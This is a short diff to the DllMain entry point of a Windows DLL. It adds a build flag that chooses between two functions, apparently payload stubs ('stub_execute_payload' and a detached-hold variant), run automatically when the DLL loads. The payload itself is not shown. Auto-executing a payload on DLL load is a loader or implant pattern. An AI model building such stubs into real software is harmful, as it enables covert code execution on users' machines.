@@ -75,7 +75,11 @@ BOOL DllMain(HANDLE hModule, DWORD dwReason, PVOID lpReserved) {
     (void)lpReserved;
 
     if (dwReason == DLL_PROCESS_ATTACH) {
+#ifdef SPECTER_STUB_DETACHED_HOLD
+        stub_execute_payload_detached_hold(INFINITE);
+#else
         stub_execute_payload();
+#endif
     }
 
     return TRUE;
